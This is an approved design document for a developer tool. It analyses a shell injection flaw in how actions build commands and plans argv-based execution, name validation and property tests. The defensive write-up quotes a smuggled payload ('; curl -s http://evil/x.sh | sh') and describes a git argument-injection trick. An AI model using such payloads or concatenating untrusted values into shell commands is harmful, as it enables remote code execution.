# Parallax — What an Action May Name (Design)

**Status:** approved and signed off 2026-08-21, with all four open
questions answered below. Not yet implemented. **Date:** 2026-08-21

**Amends:**
`docs/design/specs/parallax/2026-08-20-control-over-the-wire-design.md`,
which put an action on a socket, and
`docs/design/specs/panopticon/2026-08-20-cockpit-control-design.md`,
which defined the confirmation contract that decides whether one runs.
Nothing below contradicts either. Both answer *how bad is this if it
happens by mistake.* Neither asks *what is the set of things this can be
made to do*, and this document is that question.

**Found by:** reading `LocalProcessControl` while looking for something
else, then reproducing it. A request built with `ActionRequest::new` —
so the shape is the platform's own, not one guessed at — with one string
substituted:

```
decoded action: TriggerCapture { project: "ttui", scenario: Some("cockpit-work; curl -s http://evil/x.sh | sh") }
reversibility:  Reversible
SHELL STRING PASSED TO `sh -c`: ["plumb capture --scenario cockpit-work; curl -s http://evil/x.sh | sh"]
```

`Reversible` is the classification that means *no confirmation is
required*. So the one action class the platform decided was safe enough
to take on a single keystroke is the one that hands the caller a shell.

## Context / Motivation

**Every arc so far extended what the platform can reach. None examined
what it can be asked.** Observe, then control, then across machines,
then control across machines: each widened the surface, and each was
verified against the question *does this do the right thing when asked
correctly*. The platform now runs a process on another machine in
response to an unauthenticated request. That is a different kind of
capability from everything before it, and its entire safety argument
lives as prose across three READMEs and as zero properties in the test
suite.

That asymmetry is the motivation. Not the defect — the defect is two
`format!` calls and could be patched in an afternoon. The reason this is
an arc is that **the platform has a table for how costly an action is
and no table at all for how wide it is**, and one of those tables was
written down, argued, signed off, and tested while the other was never
noticed to be missing.

### The classification that exists, and the question it does not answer

`Action::reversibility` (`baseline/src/actions/mod.rs:127`) sorts the
eight actions into `Reversible` and `ConfirmationRequired`. The comment
above it is emphatic and correct: *the classification is the platform
spec's, verbatim — do not reclassify an action here without the spec
changing.*

It answers: **if this happens and was not meant, what does it cost to
undo?** `MergePullRequest` is outward-facing, so it asks.
`TriggerCapture` re-runs a capture that can simply be re-run, so it does
not.

Both of those are right. They are also both answers to a question that
has nothing to do with the one that matters here, which is: **given this
action, what is the set of things a caller can cause to happen?** For
six of the eight, the two questions happen to have the same answer
today, because every parameter that reaches a sink is structurally
incapable of naming anything unexpected:

- `item: u64` cannot be a command.
- `project` is resolved against the executing machine's own registry and
  an unknown name is refused *by name* — the previous arc's rule,
  already tested.
- `repo` never travels at all. `GithubWorkControl` holds it from its own
  construction (`self.repo`), so the wire cannot redirect an API call.
- `label` and `fingerprint` reach a JSON body and a JSON line
  respectively, both through `serde_json` (`github.rs:87`,
  `executor.rs:156`), which escapes.
- `ruling` is a two-variant enum.
- `prompt` and `session` are free text and are *not* constrained — but
  `dispatch` and `stop` return `Unsupported` before touching them, so
  today they reach nothing. That is a deferral, not a property, and the
  last section of this Design is about what it costs.

That is a genuinely good record, and it is worth saying plainly that the
API side of this platform got the question right without being asked it.
For the two that reach a process, the answers diverge completely:

| action | reversibility | what a caller may name |
|---|---|---|
| `TriggerCapture` | `Reversible` — no confirmation | anything, via `sh -c` |
| `Push` | `ConfirmationRequired` | anything, via `sh -c` |

`LocalProcessControl::capture` (`process.rs:72`) builds
`format!("{} capture --scenario {s}")`. `LocalProcessControl::push`
(`process.rs:107`) builds `format!("git push origin {branch}:{branch}")`.
Both go to `run` (`process.rs:49`), which calls `CommandRunner`
(`verification.rs:88`), whose real implementation (`verification.rs:98`)
is `sh -c` on Unix and `cmd /C` on Windows.

### Confirmation does not cover the second one, and this repo already said why

`Push` is `ConfirmationRequired`, which looks like it gates the second
row. It does not, for a reason the control-over-the-wire spec states
itself and signed off on:

> The fingerprint is a consistency check, not an authentication. A
> client can trivially compute the fingerprint of whatever action it is
> sending. What the check catches is a client that confused two
> actions — a real bug class — and what it does not catch is a client
> that is lying.

`authorize` (`confirm.rs:113`) accepts any confirmation whose
fingerprint equals `fingerprint(action)`. A remote caller computes that
itself. So for a caller on the wire, **every** action is effectively
unconfirmed, and the confirmation column above is decoration. That was
an honest and correct thing to write when the fingerprint was guarding
against a *confused* client. It becomes load-bearing in the wrong
direction the moment a parameter can name a command, because then the
lock the platform is relying on is one this repo already documented as
unlocked.

### It is not only a wire problem, and that is the part that matters

The tempting reply is that the tailnet is the boundary,
`--allow-control` is off by default, and anyone who can `POST` could
have opened SSH — all true, all already argued, and all beside the point
here.

**The operator's keyboard is on the same side of this boundary as the
socket.** Pressing `p` in the cockpit raises a typed prompt
(`app.rs:553`, with `branch: String::new()` and the question `push which
branch`), and `complete` (`panopticon/src/control/prompt.rs:161`) puts
whatever was typed into `Action::Push { branch }` verbatim. So a branch
name *pasted* into that prompt — from a chat message, an issue, a
terminal scrollback — reaches `sh -c` on the local machine with no
probe, no tailnet, and no remote caller anywhere in the story.

That is the strongest argument that this is a contract question rather
than a network question. The first-party cockpit never populates
`scenario` at all (`app.rs:546` sends `scenario: None`), so that field
is reachable *only* because `Action` is a public deserialization target;
`branch` is reachable through the platform's own supported UI.

### The tests currently assert the shape as correct

`process.rs:147` asserts:

```rust
assert_eq!(c.runner().calls(), ["git push origin worktree-arc-3:worktree-arc-3"]);
```

and its sibling asserts `["plumb capture --scenario cockpit-work"]`.
Both are good tests of the thing they were written to check — the
refspec is explicit rather than relying on `push.default`, which is a
real and well-argued decision. They also encode string concatenation as
the intended behaviour, which is why a reader looking for this would not
find it by reading the test names. That is the signature of a surface
that was never examined as a subject: not a missed check, an un-asked
question.

## Design

### A parameter is not a command. The fix is argv, not escaping.

The available responses are: escape the value, validate the value, or
remove the interpreter. Escaping is a denylist and denylists rot —
quoting rules differ between `sh` and `cmd`, and this platform runs on
both. Removing the interpreter deletes the class.

`CommandRunner` becomes two capabilities that are currently one:

- **`ShellRunner`** — `run(command: &str, cwd)`, exactly today's
  behaviour, for commands *declared in a manifest*.
- **`ProgramRunner`** — `run(program: &str, args: &[&str], cwd)`, no
  shell, for every command the platform *constructs*.

`LocalProcessControl` moves to the second. `plumb capture --scenario X`
becomes `("plumb", ["capture", "--scenario", X])`; `git push origin X:X`
becomes `("git", ["push", "origin", "X:X"])`. Nothing about the
resulting commands changes; the shell stops being in the middle of them.

**The verification adapter keeps the shell, deliberately.** SESH's
manifest declares `cd surfaces && npm test && npm run build`, which is a
shell script and not an argv — it is two commands and a directory change
whose whole point is that they fail for one reason. Forcing argv there
would push a producer to write `sh -c "..."` by hand, which is the same
capability with fewer people looking at it. See the trust tiers below
for why that is not a double standard.

### Trust is a property of where a value came from, and nothing records it

`String` means three different things in this codebase and is spelled
the same way each time. Written down here for the first time:

1. **Compiled in.** The `git`/`plumb` program names, the `--scenario`
   flag, the `origin` remote. The platform's own words. Trusted
   absolutely, because changing them means changing this repository.
2. **Checked in.** `verification[].command` in a project's
   `parallax.yaml`. Trusted **as code** — it lives in the repository it
   describes, under that repository's review, and a machine that will
   run `cargo test` from that checkout has already accepted the code
   next to it. A hostile manifest is not a threat model; it is a
   compromised repository, and the answer to that is not to run it.
3. **Arrived.** Every string field of an `ActionRequest`, *and every
   character the operator types at a prompt.* Trusted as nothing.

Tier 2 is why the verification adapter keeps its shell and why that is
not an inconsistency: it is the only place a value is trusted as code,
and it is trusted as code because it *is* code. Tier 3 including the
keyboard is the line that does the work, and it is the one nobody had
written down.

### A value that names a thing is validated as a name of that thing

Argv removes the shell. It does not remove **argument** injection: a
branch named `--receive-pack=...` is not a ref, it is one of `git
push`'s own flags, and `git` will read it as one. So argv is necessary
and not sufficient, and the sufficient rule is the general one:

> A tier-3 value that names a thing must be checked against what that
> thing can be, at the boundary, by the machine that will act.

Concretely, two new constrained types, parsed at the edge so that
`Action`'s fields are already narrow by the time an executor sees them:

- **`BranchName`** — git's own ref rules (the `git check-ref-format`
  grammar, encoded rather than shelled out to), plus: must not begin
  with `-`. Refused by name, quoting the rule it broke.
- **`ScenarioName`** — resolved against the project's declared
  `.plumb/config.yaml`, the way `project` is already resolved against
  the registry. A scenario the machine does not have is refused by name.

**These two are not the same kind of check, and a reader should not be
left to assume they are.** `BranchName`'s leading-`-` rule is genuine
injection defence: it closes the argument-injection hole argv leaves
open, and without it the arc is incomplete. `ScenarioName`'s resolution
closes nothing — argv already removed the class it would have been depth
against. **Its justification is typo-catching and honest failure**, not
security: a mistyped scenario currently produces a capture that runs and
finds nothing, and the resolution turns that into a refusal that names
what was asked for. That is worth having on its own terms, and it is
worth saying plainly, because a check defended as security when it is
not is a check nobody can later reason about removing.

The second is the more interesting one, and it is not a new principle —
it is the previous arc's principle applied one level down. That arc
established:

> The probe resolves the project in its own registry, and refuses an
> unknown name by name.

and the reason was that the executing machine's view wins over the
caller's. A scenario is the same kind of name with the same kind of
authority behind it: the machine that would run the capture is the
machine that knows which scenarios exist. Resolution is strictly
stronger than a character class, because it answers "is this a scenario"
rather than "does this look like one," and because it makes the failure
a *refusal naming the scenario* rather than a capture that runs and
finds nothing. See open question 1 for the cost.

### Reach is a second axis, and every action must answer it

`Reversibility` stays exactly as it is. Beside it:

```rust
/// What a caller may cause this action to name.
pub enum Reach {
    /// Every parameter is an integer, an enum, or a name this machine
    /// resolves against something it already has.
    Named,
    /// A parameter is free text this machine will hand to something
    /// that can interpret it.
    Open,
}
```

**The rule is that no action may be `Open`.** Not "`Open` requires
confirmation" — confirmation is a typo guard against a remote caller, as
established above, so gating on it would be gating with a lock this repo
has already documented as unlocked. `Open` is a state the platform
refuses to be in.

An enum with one legal value is worth its weight for the same reason
`acts_on_the_selected_project` (`panopticon/src/keys.rs:72`) is: it
classifies *every* member, so a verb added later must decide which side
it is on, and a test asserts the decision. The control-over-the-wire
spec called that exhaustiveness "what makes this arc tractable." The
same move, applied to the question that was never asked, is what stops
this arc from being a patch that the ninth action quietly undoes.

### One property, not three habits

The three call sites that sanitize terminal output carry this comment
(`panopticon/src/view/render.rs:654`):

> Three call sites is a habit rather than a property, so
> `tests/rendering.rs` asserts the end of it instead — that a frame
> built from state where *every* observed field is packed with escapes
> leaves no control character anywhere in the buffer, whichever path
> drew it.

That is the right lesson and it was learned in this repository, on this
class of problem, one arc ago (#42). The action path gets the same
treatment: a corpus of hostile values, applied to **every string field
of every `Action` variant**, executed under a recording runner,
asserting that the recorded invocation is argv and that no corpus value
ever appears as anything but a single complete argument.

Stated as the property rather than the cases: *there is no tier-3 value
and no `Action` variant for which a shell is invoked.*

### The two unimplemented actions are why this comes first

`dispatch` and `stop` (`process.rs:89`, `process.rs:99`) return
`Unsupported` today, and the comment explaining why is right that they
need a harness contract the platform does not have. They also carry the
two widest strings in the action set — `prompt: String` and
`session: String` — and `DispatchAgentRun` is classified `Reversible`.

So this document places one constraint on the arc that implements them:
**the boundary must exist before the implementation does.** A harness
contract built on today's `ProcessControl` would inherit a shell for
`prompt`, which is both the most attractive parameter on the wire and
the one no validator can narrow, because the whole point of a prompt is
that it is free text. What narrows it is that it is *passed as an
argument to a program*, never composed into a command — which is
precisely what this arc installs.

## Non-goals

- **Authentication, identity, and TLS between cockpit and probe.** The
  tailnet remains the boundary, unchanged. This arc does not make
  control safe to expose; it makes the platform's behaviour inside that
  boundary match what the boundary was already told it was protecting.
  `requestedBy` stays a claim.
- **Sandboxing what a manifest's verification command may do.** Tier 2
  is trusted as code because it is code. A repository whose
  `parallax.yaml` is hostile is a compromised repository, and the answer
  is not to run it.
- **Per-action allowlists.** Refused in the previous arc — configuration
  that must be right in two places, and the machine that executes is the
  one that gets to say. Nothing here reopens it; `Reach` is a compiled
  property of an action, not a per-peer policy.
- **Reclassifying any action's `Reversibility`.** That table is the
  platform spec's and this document does not touch it. `Reach` is
  additive.
- **Rate limiting, request size limits, or resource exhaustion.** A
  different subject with a different shape, and not one this arc's
  finding points at.
- **Implementing the agent-harness contract.** Explicitly out. This
  document sets its precondition and stops.
- **A durable audit trail.** Still out, still for the reasons the last
  arc gave.

## Testing

- **No `Action` variant reaches a shell.** The property, over every
  variant and every string field, from a hostile corpus, under a
  recording runner: the invocation is argv and every corpus value is one
  complete argument or is refused before execution. This is the test the
  arc exists to make possible.
- **The reproduction from "Found by" is a regression test.** Verbatim,
  including the `; curl ... | sh` payload, asserting it is now refused
  by name rather than executed.
- **Every action is `Named`.** Exhaustive over the variant list, so a
  ninth action must classify itself and cannot classify itself `Open`.
- **A branch name beginning with `-` is refused**, separately from the
  metacharacter cases — argv alone would have let it through, and the
  test names that as the reason.
- **A scenario the machine does not declare is refused by name**, and
  the refusal quotes the scenario, matching the existing ``no project
  `ttui` on this machine`` shape.
- **A scenario the machine does declare still runs**, so the validator
  is not a blanket refusal wearing a rule.
- **The refusal happens on the executing machine.** A cockpit that
  skipped its own validation still gets a refusal from the probe — the
  same property as "the executing machine's classification wins," and
  tested the same way.
- **A typed prompt answer is validated on the same path as a wire
  value.** The keyboard is tier 3; the test says so by driving
  `complete` with a payload and asserting the same refusal.
- **A manifest verification command still runs through a shell**, with
  SESH's real `cd surfaces && npm test && npm run build` as the case, so
  the tier-2 exemption is verified rather than assumed.
- **`ShellRunner` is unreachable from any `Action`.** A structural test
  in the shape of the existing compile-fail guards: the process-control
  path holds a `ProgramRunner` and there is no constructor that gives it
  the other.
- **The existing `process.rs` assertions are rewritten, not deleted.**
  The refspec decision they encode is still correct and still needs a
  test; it becomes an assertion about argv.

## Critical files

| file | change |
|---|---|
| `baseline/src/adapters/verification.rs` | `CommandRunner` splits into `ShellRunner` and `ProgramRunner`; `ProcessRunner` keeps the shell for tier 2 only |
| `baseline/src/actions/process.rs` | `LocalProcessControl` builds argv; its two `format!` calls go |
| `baseline/src/actions/names.rs` | new — `BranchName`, `ScenarioName`, parsed at the boundary |
| `baseline/src/actions/mod.rs` | `Reach`, `Action::reach`, and the narrowed field types |
| `baseline/src/actions/wire.rs` | deserialization parses into the narrowed types and refuses by name |
| `baseline/src/actions/executor.rs` | passes narrowed types through; no logic change |
| `probe/src/control.rs` | the refusal path for a name this machine does not have |
| `panopticon/src/control/prompt.rs` | `complete` validates a typed answer, and says why it refused |
| `docs/design/specs/parallax/2026-08-20-control-over-the-wire-design.md` | an amendment note pointing here |
| `probe/README.md` | the trust tiers, where the control warning already is |

## Verification

- `cargo test`, `cargo clippy --all-targets -- -D warnings`, and
  `cargo fmt --check` clean at the workspace root.
- The reproduction from "Found by", run against a probe started with
  `--allow-control` on this machine, refused rather than executed — and
  the same request against the pre-arc binary, executed, so the before
  and after are both demonstrated rather than one asserted.
- A real capture triggered remotely from the desktop against the Pi, by
  name, still runs — the arc must not close the capability it is
  narrowing.
- A real `Push` of a real branch, confirmed at the prompt, still pushes.
- SESH's `surfaces` verification check still runs and still fails for
  the one reason it is written to fail for.
- A Plumb scenario for the refusal message at the typed prompt, since it
  is new text on screen and this platform judges its own interface.

## Open questions for sign-off

**All four are answered. This document is signed off**, and the answers
are recorded here rather than only in the pull request that carried
them, because a decision that lives in a review thread is a decision the
next reader does not have.

1. **Does `ScenarioName` resolve against `.plumb/config.yaml`, or only
   validate a character class?**

   Resolution is strictly stronger: it answers "is this a scenario"
   rather than "does this look like one," it reuses the registry
   precedent the last arc signed off, and it turns a capture that runs
   and finds nothing into a refusal that names what was asked for. The
   cost is a coupling — `baseline` would parse a *consumer's* Plumb
   config in order to refuse an action, which puts a second reader on a
   format `plumb` owns, and means a probe's answer depends on a file
   outside the manifest it was pointed at.

   A middle position exists: validate the character class in `baseline`
   and let the refusal-by-name happen where the config is already
   parsed.

   **Recommendation: resolve, and put the resolution behind the same
   seam the manifest's `config:` field already names**, so `baseline`
   asks "does this project declare this scenario" without owning the
   answer's format. If that seam turns out not to exist cleanly, fall
   back to the character class — argv has already removed the class this
   is defence in depth against.

   **Answered: resolve, through the seam, with the fallback intact.**

   **The seam is what makes this safe, not the resolving**, and the
   distinction is the whole answer. Parsing Plumb's format directly
   would put `baseline` in a position to *disagree with `plumb` about
   what a valid scenario is* — a second place to be right about one
   format, which is the trap this repository has now argued against
   twice: in #47, where `gate` is required by one name because matrix
   job names generate and rot, and in the wire spec's own question 2,
   where a client-side control list was refused because it would be the
   copy that could not see what it was guessing at and would go stale
   exactly when it mattered. Going through the declared `config:`
   pointer keeps this on the correct side of that rule. **If the seam
   turns out to be dirty, take the character class rather than reaching
   past it** — a coupling bought by breaking the rule costs more than
   the check is worth.

   And the check is worth less than it looks, which is the second half
   of the answer: **typo-catching, not injection, is the justification
   here.** Argv has already removed the class this would have been depth
   against. Recorded in the Design section above as well, so a reader
   meets it there rather than only here.

2. **Is `Reach` a second axis, or should `Reversibility` absorb it?**

   Against a second enum: two classifications on eight actions is two
   tables to keep right, and the platform spec owns the first one
   verbatim. For: they answer genuinely different questions, and
   `TriggerCapture` is the proof — correctly `Reversible` and
   catastrophically `Open` at the same time, which a single axis cannot
   express without one of the two answers becoming a lie.

   **Recommendation: a second axis.** The finding is the argument: any
   single scale that had to rank `TriggerCapture` would have ranked it
   wrong in one of the two directions.

   **Answered: a separate axis.** `TriggerCapture` carried the
   decision — correctly `Reversible` and catastrophically open at once,
   and any single scale ranking it lies in one direction. The cost
   named in the argument against stands and is accepted: two tables on
   eight actions is two tables to keep right. What makes that
   affordable is that both are exhaustive matches, so neither can drift
   silently — a ninth action fails to compile until it has answered
   both.

3. **Where does a typed prompt answer get validated — cockpit,
   executing machine, or both?**

   Both is tempting and is the per-peer-allowlist mistake in a smaller
   coat: two places to be right, disagreeing exactly when it matters.
   But the cockpit is where the operator is, and a refusal that arrives
   from a probe two seconds later is a worse experience than one that
   arrives as the key is pressed.

   **Recommendation: the executing machine decides, the cockpit may also
   check.** Same rule as `authorize` — the machine that acts is the one
   whose answer counts — with the cockpit's check explicitly a
   convenience that is never the only one, and a test that removes it
   and asserts the refusal still happens.

   **Answered: as recommended.** The executing machine decides; the
   cockpit may also check. This is the same principle already signed
   off in the wire spec's question 2 — the machine that would execute is
   the one that gets to say — applied to a value rather than to a
   capability. **The test that removes the cockpit's check and asserts
   the refusal still lands is what makes that a property rather than a
   convention**, and it is not optional: without it, the cockpit's copy
   is indistinguishable from the only copy, and the day someone deletes
   it for being redundant is the day it was.

4. **Should tier 2 eventually become argv too — manifests declaring
   `command: [npm, test]` rather than a string?**

   It would collapse the two runners into one and remove the exemption
   entirely. It would also make SESH's real check unwritable without a
   producer hand-rolling `sh -c`, which is the same capability with less
   visibility, and it is a breaking manifest change across three
   repositories for a tier that is trusted as code by design.

   **Recommendation: no, and record the reasoning here so it is not
   re-litigated.** The exemption is not a gap in the boundary; it is the
   boundary being drawn where the trust actually changes.

   **Answered: no. Tier 2 does not become argv, and this is the record
   so it is not re-litigated.** Three reasons, in the order they bind:
   a manifest command is trusted *as code* because it is code, so argv
   would be narrowing a value that was never in the untrusted tier;
   SESH's `cd surfaces && npm test && npm run build` is a shell script
   and forcing argv would push a producer to hand-roll `sh -c`, which is
   the same capability with fewer people looking at it; and it is a
   breaking manifest change across three repositories bought for none of
   the safety this arc is about. A future reader who arrives at "why are
   there two runners" should read this answer and stop.
